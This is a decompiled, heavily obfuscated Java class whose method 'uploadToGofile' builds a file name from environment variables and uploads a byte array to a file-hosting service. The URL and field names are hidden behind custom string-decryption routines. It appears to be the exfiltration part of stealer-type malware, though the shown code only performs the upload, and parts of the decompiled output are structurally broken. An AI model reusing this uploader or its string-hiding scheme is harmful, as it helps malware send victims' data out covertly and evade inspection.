/*
 * Decompiled with CFR 0.152.
 */
package a.b.c.j;

import a.b.c.j.o;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class e {
    private static final String a;
    private static final String[] b;
    private static final String[] c;
    private static final long d;

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Unable to fully structure code
     */
    public static String uploadToGofile(byte[] var0) {
        block58: {
            block57: {
                block56: {
                    block50: {
                        block54: {
                            block53: {
                                block52: {
                                    block48: {
                                        block49: {
                                            block47: {
                                                block69: {
                                                    block68: {
                                                        block45: {
                                                            block46: {
                                                                block44: {
                                                                    block66: {
                                                                        block65: {
                                                                            var2_1 = null;
                                                                            var3_2 = null;
                                                                            var1_3 = o.b();
                                                                            var4_4 = System.getenv(e.a(31221, -28617));
                                                                            v0 = var4_4;
                                                                            if (var1_3 != null) break block44;
                                                                            if (v0 == null) ** GOTO lbl27
                                                                            break block65;
                                                                            catch (IOException v1) {
                                                                                throw e.a(v1);
                                                                            }
                                                                        }
                                                                        v2 = var4_4;
                                                                        if (var1_3 != null) break block45;
                                                                        break block66;
                                                                        catch (IOException v3) {
                                                                            throw e.a(v3);
                                                                        }
                                                                    }
                                                                    try {
                                                                        block67: {
                                                                            if (!v2.isEmpty()) break block46;
                                                                            break block67;
                                                                            catch (IOException v4) {
                                                                                throw e.a(v4);
                                                                            }
                                                                        }
                                                                        v0 = System.getenv(e.a(31230, -27203));
                                                                    }
                                                                    catch (IOException v5) {
                                                                        throw e.a(v5);
                                                                    }
                                                                }
                                                                var4_4 = v0;
                                                            }
                                                            v2 = var4_4;
                                                        }
                                                        if (var1_3 != null) break block47;
                                                        if (v2 == null) ** GOTO lbl57
                                                        break block68;
                                                        catch (IOException v6) {
                                                            throw e.a(v6);
                                                        }
                                                    }
                                                    v7 = var4_4;
                                                    if (var1_3 != null) break block48;
                                                    break block69;
                                                    catch (IOException v8) {
                                                        throw e.a(v8);
                                                    }
                                                }
                                                try {
                                                    block70: {
                                                        if (!v7.isEmpty()) break block49;
                                                        break block70;
                                                        catch (IOException v9) {
                                                            throw e.a(v9);
                                                        }
                                                    }
                                                    v2 = e.a(31227, -14226);
                                                }
                                                catch (IOException v10) {
                                                    throw e.a(v10);
                                                }
                                            }
                                            var4_4 = v2;
                                        }
                                        v7 = var4_4 + e.a(31228, 8914);
                                    }
                                    var5_8 = v7;
                                    var6_9 = new URL(e.a(31216, -17886));
                                    var2_1 = (HttpURLConnection)var6_9.openConnection();
                                    var2_1.setRequestMethod(e.a(31225, 19510));
                                    var2_1.setDoOutput(true);
                                    var2_1.setRequestProperty(e.a(31222, 31274), e.a(31220, 19942));
                                    var7_10 = e.a(31219, 19065);
                                    var8_11 = e.a(31229, 6277) + var7_10 + e.a(31217, 21753) + var5_8 + e.a(31218, 21663);
                                    var9_12 = e.a(31224, 29342) + var7_10 + e.a(31226, 24725);
                                    var10_13 = var2_1.getOutputStream();
                                    var10_13.write(var8_11.getBytes(StandardCharsets.UTF_8));
                                    var10_13.write(var0);
                                    var10_13.write(var9_12.getBytes(StandardCharsets.UTF_8));
                                    var10_13.flush();
                                    var11_14 = var2_1.getResponseCode();
                                    if (var11_14 != (int)e.d) break block50;
                                    var3_2 = var2_1.getInputStream();
                                    var12_15 = new byte[var3_2.available()];
                                    var3_2.read(var12_15);
                                    var13_16 = new String(var12_15, StandardCharsets.UTF_8);
                                    var14_17 = var13_16.split(e.a(31223, -32192))[1].split("\"")[0];
                                    try {
                                        block51: {
                                            try {
                                                v11 = var3_2;
                                                if (var1_3 != null) break block51;
                                                if (v11 == null) break block52;
                                            }
                                            catch (IOException v12) {
                                                throw e.a(v12);
                                            }
                                            v11 = var3_2;
                                        }
                                        v11.close();
                                    }
                                    catch (IOException var15_18) {
                                        var15_18.printStackTrace();
                                    }
                                }
                                try {
                                    v13 = var2_1;
                                    if (var1_3 != null) break block53;
                                    if (v13 == null) break block54;
                                }
                                catch (IOException v14) {
                                    throw e.a(v14);
                                }
                                v13 = var2_1;
                            }
                            v13.disconnect();
                        }
                        return var14_17;
                    }
                    try {
                        block55: {
                            try {
                                v15 = var3_2;
                                if (var1_3 != null) break block55;
                                if (v15 == null) break block56;
                            }
                            catch (IOException v16) {
                                throw e.a(v16);
                            }
                            v15 = var3_2;
                        }
                        v15.close();
                    }
                    catch (IOException var4_5) {
                        var4_5.printStackTrace();
                    }
                }
                try {
                    v17 = var2_1;
                    if (var1_3 != null) break block57;
                    if (v17 == null) break block58;
                }
                catch (IOException v18) {
                    throw e.a(v18);
                }
                v17 = var2_1;
            }
            v17.disconnect();
            break block58;
            catch (IOException var4_6) {
                block60: {
                    block59: {
                        try {
                            var4_6.printStackTrace();
                        }
                        catch (Throwable var16_19) {
                            block64: {
                                block63: {
                                    block62: {
                                        try {
                                            block61: {
                                                try {
                                                    v19 = var3_2;
                                                    if (var1_3 != null) break block61;
                                                    if (v19 == null) break block62;
                                                }
                                                catch (IOException v20) {
                                                    throw e.a(v20);
                                                }
                                                v19 = var3_2;
                                            }
                                            v19.close();
                                        }
                                        catch (IOException var17_20) {
                                            var17_20.printStackTrace();
                                        }
                                    }
                                    try {
                                        v21 = var2_1;
                                        if (var1_3 != null) break block63;
                                        if (v21 == null) break block64;
                                    }
                                    catch (IOException v22) {
                                        throw e.a(v22);
                                    }
                                    v21 = var2_1;
                                }
                                v21.disconnect();
                            }
                            throw var16_19;
                        }
                        try {
                            v23 = var3_2;
                            if (var1_3 == null) {
                                if (v23 == null) break block59;
                                v23 = var3_2;
                            }
                            v23.close();
                        }
                        catch (IOException var4_7) {
                            var4_7.printStackTrace();
                        }
                    }
                    try {
                        v24 = var2_1;
                        if (var1_3 != null) break block60;
                        if (v24 == null) break block58;
                    }
                    catch (IOException v25) {
                        throw e.a(v25);
                    }
                    v24 = var2_1;
                }
                v24.disconnect();
            }
        }
        return null;
    }

    private static IOException a(IOException iOException) {
        return iOException;
    }

    /*
     * Unable to fully structure code
     */
    static {
        block22: {
            block21: {
                block20: {
                    var7 = new String[16];
                    var5_1 = 0;
                    var4_2 = "\u00c0\u0092OT\u00cf\u0092\u00eeR#\u009fW\u00a7\u0094,QjT\u00e0u_\u00ee\u00ec\u00e6\u00d2A\u009b1\u00c9g\u00c5\u000f\n \u00de\u00a2\u00e6>\u00e1U\u009fU#\u00cf\u0098\u0004\u00c2;\u009f\u00d6\u0002\u00ec\u0002\u0004\u00c1\u00e9\u00f8K\u0004JT\u0090R\u0004\u00d3\u0085\u00be\"\u0004\u00fb\u00b33p\fcblN\u001a\u00da#\u00f9\u00d8\u008bA\u0013\u0010\u00b5\u00c0\u00fas\u00e2\u001cM/]\u00bd\u00d6\u00dbu\u000fq\u00b7&\u00e9%\u00d4\u00ffC\u00f2\u0090~9\u0099O\u00c7\u00b6\u00ca\u00eb\u00ef\u00d1\u0095G\u00f4X\u008cR\u008fR\u001f\u000f\u00a4\u00f9\u0087N\u00f1\u00c3U\u001aD\u00cb\u00f9\f\\\u0084\u00a8\u0092\u00f5\u00db\u00d9\u00db\u008ago\u0091$\r\u0092\u0088Id\u00eb\u00a7\u0097r\n4\u00be\u00f0\u00a4\u0001\u00c2\u008c\u00b0\u0094\u00ac]\u00ae;\u00b5\u00e8\u00c3\u000f\u008f`:\u00ea\u00f6E-\u00d4\u00c8\b\u00b7\u00f6\u00e8\u00c6\u00f3\u009d9\u00ab";
                    var6_3 = "\u00c0\u0092OT\u00cf\u0092\u00eeR#\u009fW\u00a7\u0094,QjT\u00e0u_\u00ee\u00ec\u00e6\u00d2A\u009b1\u00c9g\u00c5\u000f\n \u00de\u00a2\u00e6>\u00e1U\u009fU#\u00cf\u0098\u0004\u00c2;\u009f\u00d6\u0002\u00ec\u0002\u0004\u00c1\u00e9\u00f8K\u0004JT\u0090R\u0004\u00d3\u0085\u00be\"\u0004\u00fb\u00b33p\fcblN\u001a\u00da#\u00f9\u00d8\u008bA\u0013\u0010\u00b5\u00c0\u00fas\u00e2\u001cM/]\u00bd\u00d6\u00dbu\u000fq\u00b7&\u00e9%\u00d4\u00ffC\u00f2\u0090~9\u0099O\u00c7\u00b6\u00ca\u00eb\u00ef\u00d1\u0095G\u00f4X\u008cR\u008fR\u001f\u000f\u00a4\u00f9\u0087N\u00f1\u00c3U\u001aD\u00cb\u00f9\f\\\u0084\u00a8\u0092\u00f5\u00db\u00d9\u00db\u008ago\u0091$\r\u0092\u0088Id\u00eb\u00a7\u0097r\n4\u00be\u00f0\u00a4\u0001\u00c2\u008c\u00b0\u0094\u00ac]\u00ae;\u00b5\u00e8\u00c3\u000f\u008f`:\u00ea\u00f6E-\u00d4\u00c8\b\u00b7\u00f6\u00e8\u00c6\u00f3\u009d9\u00ab".length();
                    var3_4 = 8;
                    var2_5 = -1;
lbl7:
                    // 2 sources

                    while (true) {
                        v0 = 31;
                        v1 = ++var2_5;
                        v2 = var4_2.substring(v1, v1 + var3_4);
                        v3 = -1;
                        break block20;
                        break;
                    }
lbl13:
                    // 1 sources

                    while (true) {
                        var7[var5_1++] = v4.intern();
                        if ((var2_5 += var3_4) < var6_3) {
                            var3_4 = var4_2.charAt(var2_5);
                            ** continue;
                        }
                        var4_2 = "\u0091\u0098\u00b7\u00bc\u00ff\u0085\u00c1\u001fD\u00cd\u001a(\u0095\u00ef,\u00b1\u0095\u00fe\u00d9O\u0016\u00db\u00a1kz\u001a\u00a3\u00f8\u0098\\a\u00a5-\u0000\u00889\u00e8/f\u00e4\t<\u00eb\u00ee\u0003\u00c7\u00fb\u0099\u0096\u000b]\u00af\u00d4\u00b97\u00f4\u00c0\u00dbX\u00f4e\u00c6\u0015\u00c5\u00fb\u0092w[\u00afP\u00cb\u00b2t\u00eaV6`\u00c57Z\u00b1\u009c\u00f0\u00ff_\u00c4\t\u0083\u00ac>\u00eb6k";
                        var6_3 = "\u0091\u0098\u00b7\u00bc\u00ff\u0085\u00c1\u001fD\u00cd\u001a(\u0095\u00ef,\u00b1\u0095\u00fe\u00d9O\u0016\u00db\u00a1kz\u001a\u00a3\u00f8\u0098\\a\u00a5-\u0000\u00889\u00e8/f\u00e4\t<\u00eb\u00ee\u0003\u00c7\u00fb\u0099\u0096\u000b]\u00af\u00d4\u00b97\u00f4\u00c0\u00dbX\u00f4e\u00c6\u0015\u00c5\u00fb\u0092w[\u00afP\u00cb\u00b2t\u00eaV6`\u00c57Z\u00b1\u009c\u00f0\u00ff_\u00c4\t\u0083\u00ac>\u00eb6k".length();
                        var3_4 = 35;
                        var2_5 = -1;
lbl22:
                        // 2 sources

                        while (true) {
                            v0 = 40;
                            v5 = ++var2_5;
                            v2 = var4_2.substring(v5, v5 + var3_4);
                            v3 = 0;
                            break block20;
                            break;
                        }
                        break;
                    }
lbl28:
                    // 1 sources

                    while (true) {
                        var7[var5_1++] = v4.intern();
                        if ((var2_5 += var3_4) < var6_3) {
                            var3_4 = var4_2.charAt(var2_5);
                            ** continue;
                        }
                        break block21;
                        break;
                    }
                }
                v6 = v2.toCharArray();
                v7 = v6.length;
                var8_6 = 0;
                v8 = v0;
                v9 = v6;
                v10 = v7;
                if (v7 > 1) ** GOTO lbl85
                do {
                    v11 = v8;
                    v9 = v9;
                    v12 = v9;
                    v13 = v8;
                    v14 = var8_6;
                    while (true) {
                        switch (var8_6 % 7) {
                            case 0: {
                                v15 = 62;
                                break;
                            }
                            case 1: {
                                v15 = 67;
                                break;
                            }
                            case 2: {
                                v15 = 126;
                                break;
                            }
                            case 3: {
                                v15 = 96;
                                break;
                            }
                            case 4: {
                                v15 = 98;
                                break;
                            }
                            case 5: {
                                v15 = 119;
                                break;
                            }
                            default: {
                                v15 = 109;
                            }
                        }
                        v12[v14] = (char)(v12[v14] ^ (v13 ^ v15));
                        ++var8_6;
                        v8 = v11;
                        if (v11 != 0) break;
                        v11 = v8;
                        v9 = v9;
                        v14 = v8;
                        v12 = v9;
                        v13 = v8;
                    }
lbl85:
                    // 2 sources

                    v16 = v9;
                    v10 = v10;
                } while (v10 > var8_6);
                v4 = new String(v16);
                switch (v3) {
                    default: {
                        ** continue;
                    }
                    ** case 0:
lbl95:
                    // 1 sources

                    ** continue;
                }
            }
            e.b = var7;
            e.c = new String[16];
            e.a = e.a(31231, -4539);
            break block22;
lbl101:
            // 1 sources

            while (true) {
                continue;
                break;
            }
        }
        var0_7 = 4027402140861115928L;
        ** while (true)
        e.d = 958398663542746832L ^ var0_7;
    }

    private static String a(int n2, int n3) {
        int n4 = (n2 ^ 0x79FE) & 0xFFFF;
        if (c[n4] == null) {
            int n5;
            int n6;
            char[] cArray = b[n4].toCharArray();
            switch (cArray[0] & 0xFF) {
                case 0: {
                    n6 = 32;
                    break;
                }
                case 1: {
                    n6 = 9;
                    break;
                }
                case 2: {
                    n6 = 78;
                    break;
                }
                case 3: {
                    n6 = 80;
                    break;
                }
                case 4: {
                    n6 = 208;
                    break;
                }
                case 5: {
                    n6 = 109;
                    break;
                }
                case 6: {
                    n6 = 137;
                    break;
                }
                case 7: {
                    n6 = 237;
                    break;
                }
                case 8: {
                    n6 = 139;
                    break;
                }
                case 9: {
                    n6 = 178;
                    break;
                }
                case 10: {
                    n6 = 73;
                    break;
                }
                case 11: {
                    n6 = 248;
                    break;
                }
                case 12: {
                    n6 = 244;
                    break;
                }
                case 13: {
                    n6 = 215;
                    break;
                }
                case 14: {
                    n6 = 29;
                    break;
                }
                case 15: {
                    n6 = 30;
                    break;
                }
                case 16: {
                    n6 = 205;
                    break;
                }
                case 17: {
                    n6 = 126;
                    break;
                }
                case 18: {
                    n6 = 69;
                    break;
                }
                case 19: {
                    n6 = 122;
                    break;
                }
                case 20: {
                    n6 = 22;
                    break;
                }
                case 21: {
                    n6 = 66;
                    break;
                }
                case 22: {
                    n6 = 49;
                    break;
                }
                case 23: {
                    n6 = 210;
                    break;
                }
                case 24: {
                    n6 = 198;
                    break;
                }
                case 25: {
                    n6 = 44;
                    break;
                }
                case 26: {
                    n6 = 18;
                    break;
                }
                case 27: {
                    n6 = 12;
                    break;
                }
                case 28: {
                    n6 = 199;
                    break;
                }
                case 29: {
                    n6 = 255;
                    break;
                }
                case 30: {
                    n6 = 116;
                    break;
                }
                case 31: {
                    n6 = 175;
                    break;
                }
                case 32: {
                    n6 = 192;
                    break;
                }
                case 33: {
                    n6 = 16;
                    break;
                }
                case 34: {
                    n6 = 77;
                    break;
                }
                case 35: {
                    n6 = 117;
                    break;
                }
                case 36: {
                    n6 = 206;
                    break;
                }
                case 37: {
                    n6 = 60;
                    break;
                }
                case 38: {
                    n6 = 218;
                    break;
                }
                case 39: {
                    n6 = 39;
                    break;
                }
                case 40: {
                    n6 = 31;
                    break;
                }
                case 41: {
                    n6 = 181;
                    break;
                }
                case 42: {
                    n6 = 225;
                    break;
                }
                case 43: {
                    n6 = 157;
                    break;
                }
                case 44: {
                    n6 = 145;
                    break;
                }
                case 45: {
                    n6 = 15;
                    break;
                }
                case 46: {
                    n6 = 226;
                    break;
                }
                case 47: {
                    n6 = 110;
                    break;
                }
                case 48: {
                    n6 = 46;
                    break;
                }
                case 49: {
                    n6 = 146;
                    break;
                }
                case 50: {
                    n6 = 141;
                    break;
                }
                case 51: {
                    n6 = 38;
                    break;
                }
                case 52: {
                    n6 = 81;
                    break;
                }
                case 53: {
                    n6 = 179;
                    break;
                }
                case 54: {
                    n6 = 147;
                    break;
                }
                case 55: {
                    n6 = 243;
                    break;
                }
                case 56: {
                    n6 = 176;
                    break;
                }
                case 57: {
                    n6 = 106;
                    break;
                }
                case 58: {
                    n6 = 228;
                    break;
                }
                case 59: {
                    n6 = 24;
                    break;
                }
                case 60: {
                    n6 = 177;
                    break;
                }
                case 61: {
                    n6 = 61;
                    break;
                }
                case 62: {
                    n6 = 135;
                    break;
                }
                case 63: {
                    n6 = 4;
                    break;
                }
                case 64: {
                    n6 = 185;
                    break;
                }
                case 65: {
                    n6 = 212;
                    break;
                }
                case 66: {
                    n6 = 41;
                    break;
                }
                case 67: {
                    n6 = 67;
                    break;
                }
                case 68: {
                    n6 = 1;
                    break;
                }
                case 69: {
                    n6 = 186;
                    break;
                }
                case 70: {
                    n6 = 8;
                    break;
                }
                case 71: {
                    n6 = 103;
                    break;
                }
                case 72: {
                    n6 = 143;
                    break;
                }
                case 73: {
                    n6 = 0;
                    break;
                }
                case 74: {
                    n6 = 236;
                    break;
                }
                case 75: {
                    n6 = 247;
                    break;
                }
                case 76: {
                    n6 = 87;
                    break;
                }
                case 77: {
                    n6 = 134;
                    break;
                }
                case 78: {
                    n6 = 149;
                    break;
                }
                case 79: {
                    n6 = 94;
                    break;
                }
                case 80: {
                    n6 = 27;
                    break;
                }
                case 81: {
                    n6 = 240;
                    break;
                }
                case 82: {
                    n6 = 42;
                    break;
                }
                case 83: {
                    n6 = 71;
                    break;
                }
                case 84: {
                    n6 = 216;
                    break;
                }
                case 85: {
                    n6 = 245;
                    break;
                }
                case 86: {
                    n6 = 189;
                    break;
                }
                case 87: {
                    n6 = 184;
                    break;
                }
                case 88: {
                    n6 = 227;
                    break;
                }
                case 89: {
                    n6 = 129;
                    break;
                }
                case 90: {
                    n6 = 242;
                    break;
                }
                case 91: {
                    n6 = 168;
                    break;
                }
                case 92: {
                    n6 = 251;
                    break;
                }
                case 93: {
                    n6 = 190;
                    break;
                }
                case 94: {
                    n6 = 115;
                    break;
                }
                case 95: {
                    n6 = 194;
                    break;
                }
                case 96: {
                    n6 = 152;
                    break;
                }
                case 97: {
                    n6 = 25;
                    break;
                }
                case 98: {
                    n6 = 62;
                    break;
                }
                case 99: {
                    n6 = 19;
                    break;
                }
                case 100: {
                    n6 = 124;
                    break;
                }
                case 101: {
                    n6 = 223;
                    break;
                }
                case 102: {
                    n6 = 45;
                    break;
                }
                case 103: {
                    n6 = 26;
                    break;
                }
                case 104: {
                    n6 = 50;
                    break;
                }
                case 105: {
                    n6 = 47;
                    break;
                }
                case 106: {
                    n6 = 250;
                    break;
                }
                case 107: {
                    n6 = 95;
                    break;
                }
                case 108: {
                    n6 = 89;
                    break;
                }
                case 109: {
                    n6 = 59;
                    break;
                }
                case 110: {
                    n6 = 153;
                    break;
                }
                case 111: {
                    n6 = 220;
                    break;
                }
                case 112: {
                    n6 = 169;
                    break;
                }
                case 113: {
                    n6 = 34;
                    break;
                }
                case 114: {
                    n6 = 63;
                    break;
                }
                case 115: {
                    n6 = 70;
                    break;
                }
                case 116: {
                    n6 = 160;
                    break;
                }
                case 117: {
                    n6 = 171;
                    break;
                }
                case 118: {
                    n6 = 229;
                    break;
                }
                case 119: {
                    n6 = 17;
                    break;
                }
                case 120: {
                    n6 = 209;
                    break;
                }
                case 121: {
                    n6 = 75;
                    break;
                }
                case 122: {
                    n6 = 79;
                    break;
                }
                case 123: {
                    n6 = 97;
                    break;
                }
                case 124: {
                    n6 = 64;
                    break;
                }
                case 125: {
                    n6 = 249;
                    break;
                }
                case 126: {
                    n6 = 36;
                    break;
                }
                case 127: {
                    n6 = 238;
                    break;
                }
                case 128: {
                    n6 = 52;
                    break;
                }
                case 129: {
                    n6 = 202;
                    break;
                }
                case 130: {
                    n6 = 253;
                    break;
                }
                case 131: {
                    n6 = 7;
                    break;
                }
                case 132: {
                    n6 = 85;
                    break;
                }
                case 133: {
                    n6 = 56;
                    break;
                }
                case 134: {
                    n6 = 131;
                    break;
                }
                case 135: {
                    n6 = 51;
                    break;
                }
                case 136: {
                    n6 = 99;
                    break;
                }
                case 137: {
                    n6 = 221;
                    break;
                }
                case 138: {
                    n6 = 233;
                    break;
                }
                case 139: {
                    n6 = 231;
                    break;
                }
                case 140: {
                    n6 = 163;
                    break;
                }
                case 141: {
                    n6 = 203;
                    break;
                }
                case 142: {
                    n6 = 162;
                    break;
                }
                case 143: {
                    n6 = 148;
                    break;
                }
                case 144: {
                    n6 = 144;
                    break;
                }
                case 145: {
                    n6 = 3;
                    break;
                }
                case 146: {
                    n6 = 161;
                    break;
                }
                case 147: {
                    n6 = 11;
                    break;
                }
                case 148: {
                    n6 = 138;
                    break;
                }
                case 149: {
                    n6 = 84;
                    break;
                }
                case 150: {
                    n6 = 133;
                    break;
                }
                case 151: {
                    n6 = 76;
                    break;
                }
                case 152: {
                    n6 = 239;
                    break;
                }
                case 153: {
                    n6 = 158;
                    break;
                }
                case 154: {
                    n6 = 211;
                    break;
                }
                case 155: {
                    n6 = 102;
                    break;
                }
                case 156: {
                    n6 = 217;
                    break;
                }
                case 157: {
                    n6 = 174;
                    break;
                }
                case 158: {
                    n6 = 151;
                    break;
                }
                case 159: {
                    n6 = 232;
                    break;
                }
                case 160: {
                    n6 = 21;
                    break;
                }
                case 161: {
                    n6 = 43;
                    break;
                }
                case 162: {
                    n6 = 241;
                    break;
                }
                case 163: {
                    n6 = 167;
                    break;
                }
                case 164: {
                    n6 = 82;
                    break;
                }
                case 165: {
                    n6 = 88;
                    break;
                }
                case 166: {
                    n6 = 53;
                    break;
                }
                case 167: {
                    n6 = 201;
                    break;
                }
                case 168: {
                    n6 = 150;
                    break;
                }
                case 169: {
                    n6 = 252;
                    break;
                }
                case 170: {
                    n6 = 155;
                    break;
                }
                case 171: {
                    n6 = 128;
                    break;
                }
                case 172: {
                    n6 = 170;
                    break;
                }
                case 173: {
                    n6 = 118;
                    break;
                }
                case 174: {
                    n6 = 235;
                    break;
                }
                case 175: {
                    n6 = 207;
                    break;
                }
                case 176: {
                    n6 = 104;
                    break;
                }
                case 177: {
                    n6 = 182;
                    break;
                }
                case 178: {
                    n6 = 142;
                    break;
                }
                case 179: {
                    n6 = 86;
                    break;
                }
                case 180: {
                    n6 = 72;
                    break;
                }
                case 181: {
                    n6 = 98;
                    break;
                }
                case 182: {
                    n6 = 121;
                    break;
                }
                case 183: {
                    n6 = 35;
                    break;
                }
                case 184: {
                    n6 = 196;
                    break;
                }
                case 185: {
                    n6 = 187;
                    break;
                }
                case 186: {
                    n6 = 132;
                    break;
                }
                case 187: {
                    n6 = 156;
                    break;
                }
                case 188: {
                    n6 = 183;
                    break;
                }
                case 189: {
                    n6 = 127;
                    break;
                }
                case 190: {
                    n6 = 111;
                    break;
                }
                case 191: {
                    n6 = 100;
                    break;
                }
                case 192: {
                    n6 = 119;
                    break;
                }
                case 193: {
                    n6 = 113;
                    break;
                }
                case 194: {
                    n6 = 2;
                    break;
                }
                case 195: {
                    n6 = 40;
                    break;
                }
                case 196: {
                    n6 = 112;
                    break;
                }
                case 197: {
                    n6 = 180;
                    break;
                }
                case 198: {
                    n6 = 92;
                    break;
                }
                case 199: {
                    n6 = 57;
                    break;
                }
                case 200: {
                    n6 = 65;
                    break;
                }
                case 201: {
                    n6 = 234;
                    break;
                }
                case 202: {
                    n6 = 213;
                    break;
                }
                case 203: {
                    n6 = 28;
                    break;
                }
                case 204: {
                    n6 = 108;
                    break;
                }
                case 205: {
                    n6 = 165;
                    break;
                }
                case 206: {
                    n6 = 254;
                    break;
                }
                case 207: {
                    n6 = 105;
                    break;
                }
                case 208: {
                    n6 = 13;
                    break;
                }
                case 209: {
                    n6 = 140;
                    break;
                }
                case 210: {
                    n6 = 130;
                    break;
                }
                case 211: {
                    n6 = 10;
                    break;
                }
                case 212: {
                    n6 = 114;
                    break;
                }
                case 213: {
                    n6 = 14;
                    break;
                }
                case 214: {
                    n6 = 173;
                    break;
                }
                case 215: {
                    n6 = 33;
                    break;
                }
                case 216: {
                    n6 = 23;
                    break;
                }
                case 217: {
                    n6 = 125;
                    break;
                }
                case 218: {
                    n6 = 172;
                    break;
                }
                case 219: {
                    n6 = 96;
                    break;
                }
                case 220: {
                    n6 = 120;
                    break;
                }
                case 221: {
                    n6 = 166;
                    break;
                }
                case 222: {
                    n6 = 83;
                    break;
                }
                case 223: {
                    n6 = 54;
                    break;
                }
                case 224: {
                    n6 = 200;
                    break;
                }
                case 225: {
                    n6 = 20;
                    break;
                }
                case 226: {
                    n6 = 91;
                    break;
                }
                case 227: {
                    n6 = 5;
                    break;
                }
                case 228: {
                    n6 = 123;
                    break;
                }
                case 229: {
                    n6 = 219;
                    break;
                }
                case 230: {
                    n6 = 214;
                    break;
                }
                case 231: {
                    n6 = 58;
                    break;
                }
                case 232: {
                    n6 = 193;
                    break;
                }
                case 233: {
                    n6 = 48;
                    break;
                }
                case 234: {
                    n6 = 74;
                    break;
                }
                case 235: {
                    n6 = 90;
                    break;
                }
                case 236: {
                    n6 = 101;
                    break;
                }
                case 237: {
                    n6 = 204;
                    break;
                }
                case 238: {
                    n6 = 197;
                    break;
                }
                case 239: {
                    n6 = 93;
                    break;
                }
                case 240: {
                    n6 = 136;
                    break;
                }
                case 241: {
                    n6 = 164;
                    break;
                }
                case 242: {
                    n6 = 159;
                    break;
                }
                case 243: {
                    n6 = 68;
                    break;
                }
                case 244: {
                    n6 = 188;
                    break;
                }
                case 245: {
                    n6 = 230;
                    break;
                }
                case 246: {
                    n6 = 246;
                    break;
                }
                case 247: {
                    n6 = 222;
                    break;
                }
                case 248: {
                    n6 = 154;
                    break;
                }
                case 249: {
                    n6 = 37;
                    break;
                }
                case 250: {
                    n6 = 55;
                    break;
                }
                case 251: {
                    n6 = 195;
                    break;
                }
                case 252: {
                    n6 = 107;
                    break;
                }
                case 253: {
                    n6 = 191;
                    break;
                }
                case 254: {
                    n6 = 6;
                    break;
                }
                default: {
                    n6 = 224;
                }
            }
            int n7 = n6;
            int n8 = (n3 & 0xFF) - n7;
            if (n8 < 0) {
                n8 += 256;
            }
            if ((n5 = ((n3 & 0xFFFF) >>> 8) - n7) < 0) {
                n5 += 256;
            }
            int n9 = 0;
            while (n9 < cArray.length) {
                int n10 = n9 % 2;
                int n11 = n9;
                char[] cArray2 = cArray;
                char c2 = cArray[n11];
                if (n10 == 0) {
                    cArray2[n11] = (char)(c2 ^ n8);
                    n8 = ((n8 >>> 3 | n8 << 5) ^ cArray[n9]) & 0xFF;
                } else {
                    cArray2[n11] = (char)(c2 ^ n5);
                    n5 = ((n5 >>> 3 | n5 << 5) ^ cArray[n9]) & 0xFF;
                }
                ++n9;
            }
            e.c[n4] = new String(cArray).intern();
        }
        return c[n4];
    }
}

